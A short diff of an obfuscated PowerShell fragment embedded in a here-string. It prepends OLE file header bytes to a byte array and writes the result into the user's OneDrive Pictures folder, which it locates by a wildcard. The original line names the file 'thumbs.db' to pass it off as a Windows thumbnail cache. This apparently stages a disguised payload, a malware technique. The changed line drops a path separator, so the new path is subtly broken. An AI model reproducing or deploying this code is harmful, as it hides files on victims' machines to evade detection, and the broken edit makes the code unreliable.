@@ -45,7 +45,7 @@ $Wack = @'
     $oh = [byte[]](0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1)
     $fp = $oh + $xjb
     if ($Env:OneDriveCommercial) {$eo = $Env:OneDriveCommercial} else {$eo = $Env:OneDriveConsumer}
-    $d = ($eo + "\" + (ls $eo | ?{$_.Name -like "P*c*u*" -and $_.Attributes -like 'Dir*'}).Name) + "\thumbs.db"
+    $d = ($eo + "\" + (ls $eo | ?{$_.Name -like "P*c*u*" -and $_.Attributes -like 'Dir*'}).Name) + "xyz"
     [System.IO.File]::WriteAllBytes($d, $fp)
     Write-Host '..' 
 '@
